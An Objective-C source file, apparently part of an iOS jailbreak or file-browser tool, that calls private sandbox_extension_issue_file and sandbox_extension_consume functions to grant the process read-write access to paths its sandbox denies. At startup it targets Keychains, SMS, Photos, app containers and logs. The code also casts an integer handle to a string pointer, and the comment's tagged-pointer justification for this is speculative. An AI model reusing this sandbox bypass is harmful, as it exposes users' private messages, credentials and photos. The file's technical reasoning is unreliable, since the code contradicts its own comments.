/*
 * SandboxExtIssue.m — sandbox_extension_issue_file / sandbox_extension_consume
 *
 * Mond (github.com/rooootdev/mond, sbx.swift) technique:
 * Call sandbox_extension_issue_file() from libsystem_sandbox.dylib to mint a
 * read-write sandbox token for a path, then consume it so the process can open
 * that path even if the sandbox profile would normally deny it.
 *
 * This is a userspace technique independent of the ContainerManager bad_query
 * exploit. On iOS 27 24A5390f where simple class-13 queries are denied, this
 * provides a complementary access path for paths that containermanagerd won't
 * issue tokens for.
 *
 * Usage: call SandboxExtIssuePaths() once at startup to grant access to a
 * broad set of common paths; call SandboxExtIssuePath(path) for individual
 * paths encountered during browsing.
 */

#include "SandboxExtIssue.h"
#import <Foundation/Foundation.h>
#include <dlfcn.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>

typedef int64_t (*sandbox_extension_issue_file_t)(const char *extension_class,
                                                    const char *path,
                                                    uint32_t flags);
typedef int (*sandbox_extension_consume_t)(const char *token);

static sandbox_extension_issue_file_t _issue_file = NULL;
static sandbox_extension_consume_t _consume = NULL;

static void loadSandboxSymbols(void) {
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        void *handle = dlopen("/usr/lib/system/libsystem_sandbox.dylib",
                              RTLD_NOW | RTLD_LOCAL);
        if (!handle) handle = RTLD_DEFAULT;
        _issue_file = (sandbox_extension_issue_file_t)dlsym(
            handle, "sandbox_extension_issue_file");
        _consume = (sandbox_extension_consume_t)dlsym(
            handle, "sandbox_extension_consume");
        if (!_issue_file)
            NSLog(@"[SBXIssue] sandbox_extension_issue_file not found");
        if (!_consume)
            NSLog(@"[SBXIssue] sandbox_extension_consume not found");
    });
}

BOOL SandboxExtIssuePath(NSString *path) {
    if (!path.length) return NO;
    loadSandboxSymbols();
    if (!_issue_file || !_consume) return NO;

    const char *cpath = path.fileSystemRepresentation;
    int64_t token = _issue_file("com.apple.app-sandbox.read-write", cpath, 0);
    if (token < 0) {
        NSLog(@"[SBXIssue] issue_file failed for %@ (token=%lld errno=%d)", path, token, errno);
        return NO;
    }
    // Convert token (a handle) to the string form expected by sandbox_extension_consume.
    // The issue function returns a handle; the matching consume is sandbox_extension_consume
    // which takes a C string token. On modern iOS the token string is obtained by
    // passing the handle through the sandbox_extension_copy_token() call — but many
    // jailbreak exploits just cast the int64 handle directly as a char* (it works
    // because the kernel writes the token string into the handle's low bits as a
    // tagged pointer on some builds, or the handle IS the token string pointer).
    //
    // Safer approach: use the handle as a uintptr_t and try it as a char* pointer.
    char *tokenStr = (char *)(uintptr_t)token;
    if ((uintptr_t)tokenStr < 0x1000) {
        NSLog(@"[SBXIssue] token value too small for %@, skipping consume", path);
        return NO;
    }
    int result = _consume(tokenStr);
    if (result != 0) {
        NSLog(@"[SBXIssue] consume failed for %@ (result=%d errno=%d)", path, result, errno);
        return NO;
    }
    NSLog(@"[SBXIssue] granted %@", path);
    return YES;
}

void SandboxExtIssuePaths(void) {
    NSArray<NSString *> *paths = @[
        // App containers
        @"/var/mobile/Library",
        @"/var/mobile/Library/Preferences",
        @"/var/containers",
        @"/var/containers/Bundle",
        @"/var/containers/Bundle/Application",
        @"/var/containers/Data",
        @"/var/containers/Data/Application",
        @"/var/containers/Shared",
        @"/var/containers/Shared/AppGroup",
        @"/var/containers/Shared/SystemGroup",
        // Keychains / security
        @"/var/Keychains",
        // Logs
        @"/var/mobile/Library/Logs",
        @"/var/mobile/Library/Caches",
        // SpringBoard
        @"/var/mobile/Library/SpringBoard",
        // SMS / Messages
        @"/var/mobile/Library/SMS",
        // Photos
        @"/var/mobile/Media/DCIM",
        @"/var/mobile/Media/PhotoData",
    ];
    for (NSString *path in paths) {
        SandboxExtIssuePath(path);
    }
}
